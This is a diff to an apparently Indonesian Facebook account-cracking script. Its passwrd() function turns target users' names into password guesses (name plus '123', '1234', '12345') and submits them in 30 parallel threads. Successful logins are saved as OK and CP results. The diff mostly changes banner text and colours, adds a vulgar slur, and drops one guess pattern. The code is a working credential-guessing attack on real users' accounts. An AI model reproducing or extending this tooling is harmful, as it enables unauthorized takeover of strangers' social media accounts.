@@ -623,9 +623,12 @@ def setting():
 	exit() 
 #-------------------[ BAGIAN-WORDLIST ]------------#
 def passwrd():
-	jalan(f'➥➥➣ Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
-	jalan(f'➥➥➣ Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
-	jalan(f'➥➥➣ Mainkan Mode Jandazz Setiap {m}500{x} Idz\n')
+	cetak(nel('[bold cyan]       SEMOGA ,  BERUNTUNG KONTOL [bold cyan]')) 
+	print(f'                    {m}H {k}A {h}R {u}A {b}P {u}  ★  {b}S {u}A {h} B{k} A{m} R{b}')
+	print('')
+	print(f'➥➥➣Hasil {h}OK{u} Tersimpan Di : {h}OK/%s {b}'%(okc))
+	print(f'➥➥➣Hasil {k}CP{h} Tersimpan Di : {k}CP/%s {b}'%(cpc))
+	print(f'➥➥➣Mainkan Mode Pesawat Setiap {h}1k{u} Idz\n')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -636,7 +639,6 @@ def passwrd():
 					pass
 				else:
 					pwv.append(frs+'123')
-					pwv.append(frs+'321')
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
 			else:
@@ -645,7 +647,6 @@ def passwrd():
 				else:
 					pwv.append(nmf)
 					pwv.append(frs+'123')
-					pwv.append(frs+'321')
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
 			if 'ya' in pwpluss:
@@ -663,16 +664,16 @@ def passwrd():
 			else:
 				pool.submit(crackmbasic,idf,pwv)
 	print('')
-	cetak(nel('\t[cyan]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] '))
-	print(f'➤[{b}•➤]{h} OK : {h}%s '%(ok))
-	print(f'➤[{b}•➤]{k} CP : {k}%s{x} '%(cp))
+	cetak(nel('\t[purple]➥➥➣[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[purple] <<[yellow] '))
+	print(f'[{h}•{u}]{h} OK : {h}%s '%(ok))
+	print(f'{k}[{k}•{h}]{k} CP : {k}%s{u} '%(cp))
 	print('')
-	print('➤ Lanjut Crack Kembali ( Y/t ) ? ')
-	woi = input('➤ Pilih : ')
+	print('{k}➥➥➣Lanjut Crack Kembali ( Y/t ) ? ')
+	woi = input('➥➥➣Pilih : ')
 	if woi in ['y','Y']:
 		back()
 	else:
-		print(f'\t➤{k} Good Bye Dadaahh ')
+		print(f'\t{x}➥➥➣{k} Good Bye Dadaahh{u} ')
 		time.sleep(2)
 		exit()
 #--------------------[ METODE-B-API ]-----------------#
